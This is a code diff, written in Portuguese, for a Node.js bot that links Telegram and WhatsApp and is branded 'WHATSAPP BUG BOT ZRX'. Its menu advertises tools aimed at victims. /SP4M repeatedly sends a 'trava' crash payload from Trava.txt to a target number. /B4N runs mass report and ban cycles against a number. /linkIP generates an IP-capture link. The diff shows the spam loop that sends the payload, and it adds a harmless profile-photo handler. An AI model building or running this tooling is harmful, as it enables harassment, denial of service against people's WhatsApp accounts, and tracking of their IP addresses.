@@ -121,13 +121,22 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
             console.log(`Mensagem recebida de ${remoteJid}:${texto}`);
 
             if (texto.trim() === '/menu') {
+                const numeroUsuario = remoteJid.split('@')[0];
+                const dataHoraAtual = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
+
                 const menuTexto = 
-                    `🤖 *MENU DE COMANDOS - ZRX*\n\n` +
-                    `📌 \`/ip <endereço>\` - Consulta informações de um IP via ipinfo.io\n` +
-                    `🔗 \`/linkIP\` - Gera um link personalizado de captura integrado ao Firebase\n` +
-                    `⚡ \`/SP4M <número> <quantidade>\` - Disparo da trava do arquivo Trava.txt\n` +
-                    `🛡️ \`/B4N <número> <quantidade>\` - Ciclo de denúncias/banimento em massa\n\n` +
-                    `Envie o comando desejado!`;
+                    `⛩️ *WHATSAPP BUG BOT ZRX* ⛩️\n\n` +
+                    `💬 *Suporte:* @Zenithzrx\n` +
+                    `📱 *Número de usuário:* \`${numeroUsuario}\`\n` +
+                    `⭐ *Status:* FREE USER\n` +
+                    `🕒 *Online:* ${dataHoraAtual}\n\n` +
+                    `┏━━━⧼𝑰𝑷⧽\n` +
+                    `> /ip <endereço>\n` +
+                    `> /linkIP\n` +
+                    `╠━━━⧼WHATSAPP⧽\n` +
+                    `> /SP4M <número> <quantidade>\n` +
+                    `> /B4N <número> <quantidade>\n` +
+                    `┗━━━━━━━━━━━━━━━━━━━━━━┛`;
                 
                 await waSock.sendMessage(remoteJid, { text: menuTexto });
             }
@@ -166,7 +175,6 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     return;
                 }
 
-                // Lê o conteúdo do arquivo Trava.txt salvo na raiz do projeto
                 let conteudoTrava = "⚡ [ZRX-SPAM] Alvo sob ataque!";
                 const caminhoPayload = path.join(__dirname, 'Trava.txt');
                 if (fs.existsSync(caminhoPayload)) {
@@ -179,7 +187,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 for (let i = 1; i <= quantidade; i++) {
                     try {
                         await waSock.sendMessage(jidAlvo, { text: `${conteudoTrava}\n\n[Ciclo ${i}/${quantidade}]` });
-                        await delay(1000); // Intervalo para estabilidade do envio
+                        await delay(1000);
                     } catch (err) {
                         console.log(`Erro no ciclo ${i}:`, err.message);
                     }
@@ -244,7 +252,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 }, 3000);
             }
         } catch (erroMensagem) {
-            console.error("Erro ao processar mensagem do WhatsApp:", erroMensagem);
+            console.error("Erro asset:", erroMensagem);
         }
     });
 
@@ -267,6 +275,42 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
         }
     }
 }
+
+// Comando de Administrador no Telegram para atualizar a foto do WhatsApp
+bot.on('photo', async (msg) => {
+    const chatId = msg.chat.id;
+    if (!waSock) {
+        return bot.sendMessage(chatId, "❌ O WhatsApp não está conectado no momento. Conecte primeiro usando `/conectar`.");
+    }
+
+    try {
+        bot.sendMessage(chatId, "🔄 Baixando e atualizando a foto de perfil no WhatsApp...");
+        
+        const fotoId = msg.photo[msg.photo.length - 1].file_id;
+        const fileLink = await bot.getFileLink(fotoId);
+        
+        // Baixa a imagem temporariamente
+        const caminhoTemp = path.join(__dirname, 'temp_perfil.jpg');
+        const fileStream = fs.createWriteStream(caminhoTemp);
+
+        https.get(fileLink, (response) => {
+            response.pipe(fileStream);
+            fileStream.on('finish', async () => {
+                fileStream.close();
+                
+                // Define a foto no WhatsApp
+                const botJid = waSock.user.id;
+                await waSock.updateProfilePicture(botJid, { url: caminhoTemp });
+                
+                if (fs.existsSync(caminhoTemp)) fs.unlinkSync(caminhoTemp);
+                bot.sendMessage(chatId, "✅ Foto de perfil do WhatsApp atualizada com sucesso!");
+            });
+        });
+    } catch (err) {
+        console.error("Erro ao atualizar foto:", err);
+        bot.sendMessage(chatId, "❌ Erro ao atualizar a foto de perfil.");
+    }
+});
 
 bot.on('callback_query', async (callbackQuery) => {
     const data = callbackQuery.data;
@@ -308,7 +352,13 @@ bot.onText(/\/conectar (.+)/, async (msg, match) => {
 
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
-    bot.sendMessage(chatId, "🤖 **Bot Telegram <-> WhatsApp Ativo!**\n\n• Para conectar: `/conectar SEU_NUMERO`\n• Para limpar sessão: `/limpar`", { parse_mode: 'Markdown' });
+    bot.sendMessage(chatId, 
+        `🤖 *ZRX CONTROL SYSTEM* \n\n` +
+        `• Para conectar o WhatsApp: \`/conectar SEU_NUMERO\`\n` +
+        `• Para alterar a foto do WhatsApp: *Basta enviar ou responder com uma foto aqui no chat do Telegram!*\n` +
+        `• Para limpar sessão: \`/limpar\``, 
+        { parse_mode: 'Markdown' }
+    );
 });
 
 console.log("Bot do Telegram iniciado e escutando comandos!");
